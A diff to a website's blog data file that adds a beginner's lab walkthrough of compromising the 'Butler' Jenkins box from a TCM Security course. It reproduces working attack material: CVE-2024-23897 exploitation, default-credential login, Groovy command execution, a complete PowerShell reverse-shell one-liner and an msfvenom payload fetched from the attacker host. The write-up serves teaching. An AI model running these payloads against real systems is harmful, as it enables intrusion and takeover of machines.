@@ -1142,6 +1142,484 @@ Blue taught me the core exploit loop. Academy taught me the *chain*, how real co
 If you're just starting out like I was: pick a box, take notes, and don't be afraid to go down a wrong path. Sometimes that's where the real learning happens.
     `.trim(),
   },
+  {
+    id: "rooting-butler-walkthrough",
+    slug: "rooting-butler-walkthrough",
+    title: 'Rooting "Butler": A Beginner\'s Walkthrough',
+    date: "2026-07-19",
+    summary:
+      "A locked-down SMB null session, a Jenkins version leaking through a stray HTTP header, a CVE-2024-23897 arbitrary file read, and the one thing I almost skipped: just trying jenkins/jenkins.",
+    tags: ["PEH Capstone", "Jenkins", "CVE-2024-23897", "Default Credentials", "Reverse Shell"],
+    thumbnail: "/assets/images/blog/butler/cover.svg",
+    readTime: "19 min read",
+    content: `
+This is the story of how I broke into a machine called Butler, part of TCM Security's Practical Ethical Hacking capstone series. I'm writing it assuming you know nothing about hacking. Every tool, every concept, every weird acronym gets explained the moment it shows up. If you've never touched a terminal for anything like this before, you should still be able to follow every step.
+
+A couple of quick terms before we start. The **target** is the machine I'm trying to break into (Butler). My **attacker machine** is Kali Linux, a version of Linux built specifically with hacking tools pre-installed. Both machines sit on the same private network, so they can talk to each other, but nothing here ever touches the real internet. My Kali machine's IP address in this writeup is \`10.0.2.3\`. The target's IP is \`10.0.2.15\`. If you're following along on your own box, yours will be different, so just swap the numbers.
+
+Every hack roughly follows the same shape: figure out what's running on the target, dig into each thing you find, get some kind of initial access, then turn that limited access into full control. Keep that shape in your head. Everything below is a version of it, even when it wanders down a dead end or two first.
+
+## Step 1: Finding Out What's Even There
+
+You can't attack something you haven't found. So the very first move on any target is a port scan, using a tool called **Nmap**. It sends packets at the target and reports back which "ports" respond. Think of a port as a numbered door on a computer. Web servers usually answer on port 80, SSH on port 22, and so on. Different doors mean different services, and different services mean different ways in.
+
+\`\`\`
+nmap 10.0.2.15
+\`\`\`
+
+\`\`\`
+PORT    STATE SERVICE
+135/tcp open  msrpc
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+8080/tcp open http-proxy
+\`\`\`
+
+![nmap scan of 10.0.2.15 showing ports 135, 139, 445, and 8080 open](/assets/images/blog/butler/butler-01-nmap-basic.png)
+*A plain scan first, just to see what's listening at all.*
+
+Then I ran a deeper scan, using the \`-A\` flag, which pulls software versions, guesses the operating system, and runs a batch of extra diagnostic checks.
+
+\`\`\`
+nmap -A 10.0.2.15
+\`\`\`
+
+\`\`\`
+PORT    STATE SERVICE       VERSION
+135/tcp open  msrpc         Microsoft Windows RPC
+139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds?
+8080/tcp open  http         Jetty 9.4.41.v20210516
+|_http-server-header: Jetty(9.4.41.v20210516)
+|_http-robots.txt: 1 disallowed entry
+|_/
+OS details: Microsoft Windows 10 1709 - 22H2
+Host script results:
+|_nbstat: NetBIOS name: BUTLER, ...
+\`\`\`
+
+![nmap -A output showing ports, OS detection, and a robots.txt hint](/assets/images/blog/butler/butler-02-nmap-A.png)
+*Service versions, OS guess, and a robots.txt hint, all from one scan.*
+
+This told me a lot in one shot. Butler is a Windows machine. Ports 135, 139, and 445 together are the classic fingerprint of Windows file sharing. And on top of all that Windows plumbing, there's a web server on port 8080 running something called Jetty, and nmap noticed its \`robots.txt\` file has one disallowed entry sitting in it. Two completely different leads. I made a mental note to check both properly instead of latching onto whichever one looked more exciting.
+
+## Step 2: Poking at File Sharing First
+
+Windows machines share files and printers using a protocol called **SMB**. It's what lets you type \`\\\\SomeComputer\\SomeFolder\` into a Windows file explorer and see another machine's shared files. From an attacker's side, the very first thing worth checking is whether the server allows a **null session**, meaning you connect with no real username or password at all, and it still tells you something (a list of shares, usernames, whatever it's willing to hand over for free).
+
+I tried it with a tool called smbclient, using \`-L\` to list available shares instead of connecting to one specific folder.
+
+\`\`\`
+smbclient -L 10.0.2.15
+\`\`\`
+
+\`\`\`
+Password for [WORKGROUP\\kali]:
+session setup failed: NT_STATUS_ACCESS_DENIED
+\`\`\`
+
+![smbclient -L attempt defaulting to WORKGROUP\\\\kali as the username](/assets/images/blog/butler/butler-05-smbclient-null-session.png)
+*The flaw is easy to miss: this defaulted to my own username, not a true null session.*
+
+My gut reaction was "well, that's shut." But something bugged me about it. Look closely at that first line: \`WORKGROUP\\kali\`. Even though I hit Enter and left the password blank, smbclient had quietly defaulted my username to \`kali\`, my own local machine's username. That's not actually an anonymous request. A true null session needs an explicitly empty username too, not just a blank password.
+
+I ran it again properly, forcing both to be empty:
+
+\`\`\`
+smbclient -L //10.0.2.15/ -N -U ""
+\`\`\`
+
+\`\`\`
+session setup failed: NT_STATUS_ACCESS_DENIED
+\`\`\`
+
+Same rejection, but this time I trust it. SMB really was locked down against anonymous access. That's a reasonably well configured default, and it's the kind of thing you'll see plenty of on hardened boxes. I set it aside, figuring I'd come back to it if I ever landed real credentials somewhere else, since 445 tends to open right back up once you're not anonymous anymore.
+
+## Step 3: The Web Server Gives Itself Away
+
+\`robots.txt\` is a file websites use to tell search engines which pages not to crawl. Here's the thing though: it's completely public. Anyone can just read it, and developers occasionally write something in there that says way more than they meant to. Nmap had already flagged this one, so I pulled it up directly.
+
+\`\`\`
+http://10.0.2.15:8080/robots.txt
+\`\`\`
+
+\`\`\`
+# we don't want robots to click "build" links
+User-agent: *
+Disallow: /
+\`\`\`
+
+![robots.txt contents mentioning "build" links](/assets/images/blog/butler/butler-03-robots-txt.png)
+*A stray comment about "build" links is practically a Jenkins signature.*
+
+That comment gave the whole game away. "Build" links are practically a signature for **Jenkins**, a popular tool used for automatically building, testing, and deploying software. The important thing about Jenkins isn't just what it is, it's what it's for. Its entire job is running scripts and commands, often on a schedule, often automatically. That makes it a genuinely exciting target, because "execute arbitrary commands" isn't some bug you have to sneak past. It's a built-in feature you just need a way to reach.
+
+I checked the base URL to confirm it:
+
+\`\`\`
+http://10.0.2.15:8080/
+\`\`\`
+
+![Jenkins login page, "Welcome to Jenkins!"](/assets/images/blog/butler/butler-04-jenkins-login.png)
+*Sure enough, a big "Welcome to Jenkins!" login screen.*
+
+Sure enough, a big "Welcome to Jenkins!" login screen stared back at me.
+
+## Step 4: Nailing Down the Exact Version
+
+Knowing "it's Jenkins" isn't enough. Vulnerabilities and exploits are usually tied to specific version ranges, so guessing wrong wastes a lot of time chasing a fix that's already been patched. Nmap had told me Jetty's version, but Jetty is only the engine Jenkins happens to sit on top of. It has nothing to do with Jenkins' own version number.
+
+I looked at the page source first and found nothing useful, no visible version text anywhere. So I dropped a level lower and checked the raw HTTP response headers with curl, a command line tool for making web requests. The \`-I\` flag sends a lightweight request and shows just the headers.
+
+\`\`\`
+curl -I http://10.0.2.15:8080/
+\`\`\`
+
+\`\`\`
+HTTP/1.1 403 Forbidden
+X-Hudson: 1.395
+X-Jenkins: 2.289.3
+X-Jenkins-Session: 4a597f93
+Server: Jetty(9.4.41.v20210516)
+\`\`\`
+
+![curl -I output showing the X-Jenkins version header](/assets/images/blog/butler/butler-06-curl-headers-jenkins-version.png)
+*A custom header nobody stripped out: X-Jenkins: 2.289.3.*
+
+There it was, sitting in a custom header nobody bothered to strip out: \`X-Jenkins: 2.289.3\`. (The \`X-Hudson\` header is a fun bit of history. Jenkins used to be called Hudson before a fork and rename, and it still ships that header for old compatibility reasons.)
+
+Now I had a real, specific version to go research.
+
+## Step 5: Finding a Vulnerability That Actually Fits
+
+A CVE is basically a public ID tag for a known security flaw, so researchers everywhere are talking about the exact same bug instead of a dozen slightly different descriptions of it. Searching around 2.289.3 turned up a strong candidate.
+
+CVE-2024-23897 affects Jenkins 2.441 and earlier. Jenkins ships a command line interface for running admin operations remotely, and its argument parser has a small convenience feature: if you prefix an argument with an \`@\` symbol followed by a file path, it swaps that argument out for the actual contents of the file. Totally normal behavior for a lot of command line tools. The problem is that this substitution never checked whether you were logged in, and even a command that fails outright can leak the substituted file content back through its own error message. The result is that anyone, with zero credentials, can read arbitrary files off the server.
+
+2.289.3 sits comfortably inside "2.441 and earlier," so this one genuinely applied. Worth saying out loud: it's easy to find a CVE number that sounds right and turns out to be for completely different software, or a version that's already been patched. Always check the real advisory's affected range before betting time on it.
+
+## Step 6: Getting the Exploit Working (Two Dumb Mistakes First)
+
+Metasploit had a module ready to go.
+
+\`\`\`
+msf > search jenkins
+\`\`\`
+
+\`\`\`
+17  auxiliary/gather/jenkins_cli_ampersand_arbitrary_file_read   2024-01-24   normal   Yes   Jenkins cli Ampersand Replacement Arbitrary File Read
+\`\`\`
+
+![msfconsole search jenkins results, listing the arbitrary file read module](/assets/images/blog/butler/butler-08-msf-search-jenkins.png)
+*Module 17 is the one built for CVE-2024-23897.*
+
+\`\`\`
+use 17
+show options
+\`\`\`
+
+\`\`\`
+Name       Current Setting  Required  Description
+FILE_PATH  /etc/passwd      yes       File path to read from the server
+RHOSTS                      yes       The target host(s)
+RPORT      8080             yes       The target port (TCP)
+TARGETURI  /                yes       The base path for Jenkins
+\`\`\`
+
+Mistake one: the default FILE_PATH is \`/etc/passwd\`, a Linux path. This is a Windows box. Running it as-is wouldn't tell me anything about whether the technique works, just that I picked the wrong operating system's test file. I swapped in something universally harmless on Windows instead.
+
+\`\`\`
+set RHOSTS 10.0.2.15
+set FILE_PATH C:\\Windows\\win.ini
+run
+\`\`\`
+
+\`\`\`
+[+] The target appears to be vulnerable. Found exploitable version: 2.289.3
+[-] Exploit failed, no exploit data was successfully returned
+\`\`\`
+
+Mistake two took a minute to spot. Checking \`show options\` again showed the path had quietly turned into \`C:Windowswin.ini\`. Metasploit's console treats backslashes as escape characters, so all mine had gotten swallowed. Fix: double them up so one survives.
+
+\`\`\`
+set FILE_PATH C:\\\\Windows\\\\win.ini
+run
+\`\`\`
+
+\`\`\`
+[+] C:\\Windows\\win.ini file contents retrieved (first line or 2):
+; for 16-bit app support)
+[fonts]
+[+] Results saved to: /home/kali/.msf4/loot/..._jenkins.file_405192.txt
+\`\`\`
+
+![Metasploit exploit run confirming vulnerability and retrieving win.ini contents](/assets/images/blog/butler/butler-09-jenkins-arbitrary-file-read-confirmed.png)
+*Real content, back and confirmed. The exploit works end to end.*
+
+Real content, back and confirmed. The exploit works end to end.
+
+(Small side note for anyone trying this themselves: Metasploit's \`loot\` command initially told me "Database not connected." Its backend database, where it stores results like this, hadn't been set up yet. Running \`sudo msfdb init\` and restarting msfconsole sorted it out. Not a hacking lesson, just a first-time setup snag.)
+
+## Step 7: A Long, Slightly Frustrating Grind for Jenkins' Secrets
+
+With the technique confirmed, the obvious next move was going after Jenkins' own stored secrets. Jenkins keeps an encrypted credentials file plus a master key used to decrypt it, both living inside its home directory. The annoying part is that this home directory's location depends entirely on how Jenkins was installed, and this specific bug can only read a file if you already know its exact path. There's no "list what's in this folder" option, unlike brute-forcing web directories where you can just throw a huge wordlist at it and see what sticks.
+
+I guessed a few common install locations.
+
+\`\`\`
+set FILE_PATH C:\\\\Program Files\\\\Jenkins\\\\secrets\\\\master.key
+run
+loot
+\`\`\`
+
+Nothing new showed up. The file just wasn't there.
+
+Next I tried reading the Windows service wrapper's own config file. Jenkins on Windows usually ships with something called \`jenkins.xml\` sitting right in its install folder, describing exactly how the service starts up, including its home directory.
+
+\`\`\`
+set FILE_PATH C:\\\\Program Files\\\\Jenkins\\\\jenkins.xml
+run
+\`\`\`
+
+\`\`\`
+[+] C:\\Program Files\\Jenkins\\jenkins.xml file contents retrieved (first line or 2):
+<!--)
+The MIT License
+\`\`\`
+
+That confirmed \`C:\\Program Files\\Jenkins\` really is the install folder, since the file exists there at all. But then I ran straight into a limitation the module had been quietly warning me about the whole time. Read that log line again: "first line or 2." This module doesn't do a full file read. It works by triggering an error message that echoes back just the start of a file. Fine for something tiny like win.ini, useless for a multi-line config where the interesting part is buried further down.
+
+At that point I had a decision to make: go find a beefier standalone script that could pull a full file, or try something dumb and simple first.
+
+## Step 8: The Obvious Thing I Should Have Tried Immediately
+
+I typed \`jenkins\` into the username field and \`jenkins\` into the password field.
+
+It logged me straight in.
+
+![Jenkins dashboard after logging in with the default jenkins/jenkins credentials](/assets/images/blog/butler/butler-10-jenkins-default-creds-script-console.png)
+*Welcome to Jenkins indeed. Default credentials, straight in.*
+
+I actually felt a little stupid for a second, like I'd just gotten lucky and skipped the real work. But that reaction is wrong, and worth calling out directly. Testing default and weak credentials is one of the very first things you're supposed to try on any target, before you ever crack open a CVE. It's not a shortcut or a cheat. It's step one in basically every real penetration testing methodology out there, and it's exactly how a huge number of actual breaches happen in the real world. I'd gotten so locked onto the technical exploit path that I skipped the boring, obvious check that should have come first.
+
+Once inside, I found something even better than the file reader I'd been fighting with: a menu item called Script Console.
+
+## Step 9: Script Console, Full Code Execution By Design
+
+Script Console is a real, intended Jenkins feature that lets a logged in admin run code directly on the server, written in a language called Groovy.
+
+Groovy runs on the same underlying engine as Java, called the JVM. It's meant to be a friendlier, more flexible way to script things than writing raw Java, while still having full access to everything Java can reach. Since Jenkins itself is built in Java, a Groovy script running inside it has full access to Jenkins' own internals and to the operating system underneath, including the ability to spawn processes.
+
+None of this is a hidden bug. It's a legitimate admin tool that real Jenkins maintainers use for troubleshooting. The danger is purely that it was left sitting behind a default password.
+
+The console even hints at the syntax on the page itself:
+
+\`\`\`groovy
+println(Jenkins.instance.pluginManager.plugins)
+\`\`\`
+
+I started small, the same way I always do with anything that lets me run code. Prove it works with something harmless before trying anything real. Groovy's \`.execute()\` method spawns a string as an operating system command, and \`.text\` grabs its output as readable text.
+
+\`\`\`groovy
+def output = "whoami".execute().text
+println output
+\`\`\`
+
+Pasted into the console and run:
+
+\`\`\`
+Result
+butler\\butler
+\`\`\`
+
+![Groovy whoami test in the Script Console confirming code execution as user butler](/assets/images/blog/butler/butler-11-groovy-whoami-confirmed.png)
+*Confirmed code execution, plus a bonus fact for free: Jenkins runs as butler.*
+
+Confirmed code execution, plus a bonus fact for free. Jenkins runs as a Windows service under its own dedicated account called butler.
+
+## Step 10: Building a Reverse Shell (And Fighting My Own Syntax)
+
+A reverse shell flips the usual connection around. Instead of me connecting to the target, I get the target to connect back to me, which gives me a live, interactive command prompt. It takes two pieces: a listener waiting on my machine, and a payload on the target that dials home to it.
+
+I started a listener with netcat:
+
+\`\`\`
+nc -lvnp 4444
+\`\`\`
+
+Since this is Windows, the natural payload here is a PowerShell one-liner, a script that opens a raw network connection and pipes commands back and forth through it. My first draft tried to shove a full PowerShell script straight into a Groovy string, and it broke in three separate ways, each one worth understanding.
+
+First, I'd accidentally wrapped a whole second PowerShell invocation inside the one I was already running. Pointless, since I was already inside PowerShell the moment the outer call fired.
+
+Second, once I stripped that out, the actual script body still had a couple of double quote characters in it, and my whole Groovy string argument was also wrapped in double quotes. Groovy saw the first inner quote and thought the string had ended right there.
+
+Third, and this one was sneaky: even after fixing the quoting, Groovy double quoted strings aren't just plain strings. They're something called a GString, meaning Groovy actively scans them for \`$variableName\` patterns and tries to substitute in real Groovy variables. My PowerShell script was packed with things like \`$client\` and \`$stream\`, none of which existed as Groovy variables at all. Groovy either threw an error or quietly mangled the payload trying to interpolate things that weren't there.
+
+The clean fix was to base64 encode the entire command. PowerShell has a flag built exactly for this, \`-EncodedCommand\`, which takes a pre-encoded command and just runs it, sidestepping both the quoting mess and the interpolation problem in one move, since a base64 string has no quotes or dollar signs in it at all. One catch: PowerShell wants the command encoded as UTF-16LE bytes before the base64 step, not plain UTF-8.
+
+\`\`\`bash
+CMD='$client = New-Object System.Net.Sockets.TCPClient("10.0.2.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+echo -n "$CMD" | iconv -t UTF-16LE | base64 -w0
+\`\`\`
+
+That spat out one long base64 blob, which I dropped into a much simpler final payload, no quotes to fight, nothing left for Groovy to misread:
+
+\`\`\`groovy
+["powershell.exe", "-EncodedCommand", "<base64 blob>"].execute()
+\`\`\`
+
+Pasted it in, hit run, and watched my listener:
+
+\`\`\`
+listening on [any] 4444 ...
+connect to [10.0.2.3] from (UNKNOWN) [10.0.2.15] 49753
+PS C:\\Program Files\\Jenkins> dir
+    Directory: C:\\Program Files\\Jenkins
+-a----   jenkins.exe
+-a----   Jenkins.war
+-a----   jenkins.xml
+\`\`\`
+
+![netcat listener catching the PowerShell reverse shell as butler](/assets/images/blog/butler/butler-12-reverse-shell-caught.png)
+*A real, working shell as butler.*
+
+A real, working shell as butler.
+
+## Step 11: Upgrading to Something Sturdier
+
+A raw netcat shell is fine, but it's clunky. No tab completion, awkward file transfers, easy to lose the moment something hiccups. I upgraded to a Meterpreter session instead, Metasploit's own advanced shell with a much richer toolkit and stable file handling built in.
+
+On Kali I generated a Windows payload with msfvenom:
+
+\`\`\`bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.2.3 LPORT=5555 -f exe -o shell.exe
+\`\`\`
+
+Hosted it with a quick web server:
+
+\`\`\`bash
+python3 -m http.server 8000
+\`\`\`
+
+Downloaded it onto the target from my existing shell:
+
+\`\`\`powershell
+(New-Object System.Net.WebClient).DownloadFile('http://10.0.2.3:8000/shell.exe','C:\\Windows\\Temp\\shell.exe')
+\`\`\`
+
+Set up a matching listener in Metasploit:
+
+\`\`\`
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 10.0.2.3
+set LPORT 5555
+run
+\`\`\`
+
+And ran it:
+
+\`\`\`powershell
+C:\\Windows\\Temp\\shell.exe
+\`\`\`
+
+\`\`\`
+[*] Meterpreter session 1 opened (10.0.2.3:5555 -> 10.0.2.15:49717)
+\`\`\`
+
+![Meterpreter session opened, upgraded from the raw netcat shell](/assets/images/blog/butler/butler-13-meterpreter-session-opened.png)
+*A sturdier shell, with tab completion and stable file transfer.*
+
+## Step 12: Checking Privileges (And Realizing I Already Had Them)
+
+With a stable shell running, the standard move on Windows is checking your current account's token privileges, special permissions that often lead straight to full control.
+
+\`\`\`
+whoami /priv
+\`\`\`
+
+\`\`\`
+Privilege Name                Description                          State
+SeDebugPrivilege               Debug programs                      Enabled
+SeImpersonatePrivilege         Impersonate a client after auth      Enabled
+SeChangeNotifyPrivilege        Bypass traverse checking             Enabled
+\`\`\`
+
+SeImpersonatePrivilege being enabled is a well known escalation path on Windows service accounts, the basis for a whole family of exploits people call "Potato" attacks. But before jumping to any of that, I checked something much simpler first: what groups is this account actually in?
+
+\`\`\`
+whoami /groups
+\`\`\`
+
+\`\`\`
+BUILTIN\\Administrators   Alias   S-1-5-32-544   Mandatory group, Enabled by default, Enabled group, Group owner
+Mandatory Label\\High Mandatory Level
+\`\`\`
+
+![whoami /priv and whoami /groups output showing an enabled Administrators group membership](/assets/images/blog/butler/butler-14-privs-groups-systeminfo.png)
+*"Enabled group," not "deny only." This account was never actually restricted.*
+
+That "Enabled group" wording mattered a lot. A normal interactive admin login usually shows that same Administrators membership marked "used for deny only," thanks to how Windows splits an admin token down for everyday use. This one wasn't split at all. Combined with "High Mandatory Level," it looked like the butler service account might already be running as a full administrator, no exploit required. Services don't go through the same token restriction that interactive logins do, which explains why.
+
+I tested it directly, trying something only a real administrator should be able to do:
+
+\`\`\`
+dir C:\\Users\\Administrator\\Desktop
+\`\`\`
+
+\`\`\`
+Directory of C:\\Users\\Administrator\\Desktop
+08/14/2021  05:29 AM    <DIR>          .
+08/14/2021  05:29 AM    <DIR>          ..
+               0 File(s)
+\`\`\`
+
+No "Access is denied," clean as anything. Just to be thorough:
+
+\`\`\`
+net user
+\`\`\`
+
+\`\`\`
+User accounts for \\\\BUTLER
+ 
+Administrator            butler                  DefaultAccount
+Guest                     WDAGUtilityAccount
+\`\`\`
+
+![dir on the Administrator desktop and net user both succeeding, confirming admin access](/assets/images/blog/butler/butler-14-admin-desktop-access-confirmed.png)
+*No access denied anywhere. This account was already an administrator.*
+
+That settled it. The butler service account was already running with full administrative rights, purely because of how the service had been set up. There was no separate privilege escalation step to pull off. The "escalation" here was really just noticing privileges that were already sitting there.
+
+## Wrapping Up
+
+This box didn't end with a dramatic flag file waiting on the desktop. The goal was proving a complete chain from anonymous outside access to confirmed administrative control, which honestly is how most real engagements actually end and get written up. Once I had full read and write access as an effectively-admin account, the job was done.
+
+## The Full Kill Chain
+
+1. Nmap recon found SMB (135/139/445) and a web server on 8080.
+2. SMB null session enumeration, tested properly, came back denied.
+3. robots.txt revealed "build" links, pointing at Jenkins.
+4. curl headers exposed the exact Jenkins version, 2.289.3.
+5. Researched CVE-2024-23897 and confirmed it genuinely matched this version.
+6. Got the Metasploit module working after fixing a Linux vs Windows path issue and a backslash escaping bug, confirmed against win.ini.
+7. Tried guessing JENKINS_HOME paths, hit a hard limit where the module only reads the first line or two of a file.
+8. Tried the default credentials, jenkins and jenkins, and got straight in.
+9. Found Script Console and confirmed code execution with a simple whoami test.
+10. Built a working PowerShell reverse shell after debugging three separate quoting and interpolation bugs, solved with base64 and EncodedCommand.
+11. Upgraded to Meterpreter using msfvenom and a matching handler.
+12. Checked privileges and found the service account was already a full local administrator.
+
+## Lessons I'm Taking Away
+
+- **Test default and weak credentials early.** It's a required step in real methodology, not a lucky shortcut, and I nearly skipped it entirely chasing something flashier.
+- **Pay attention when a tool tells you exactly how it's limited.** That "first line or 2" note wasn't filler text, it was the module being upfront about what it could and couldn't do.
+- **Quoting and string interpolation bugs show up in completely different languages in the same shape.** Nested quotes and a scripting engine trying to interpret characters you didn't want touched are a pattern worth recognizing on sight, and base64 encoding the whole payload is a dependable way out of it.
+- **Privilege escalation sometimes just means noticing privileges you already have**, rather than fighting your way to new ones. Misconfigured service accounts running with full rights are a very real, very common thing to find.
+- **A denied result only means something if you're sure you tested the real thing.** My first SMB attempt looked like a locked door, but it was actually knocking on the wrong one entirely.
+    `.trim(),
+  },
 ];
 
 export function getBlogPostBySlug(slug) {
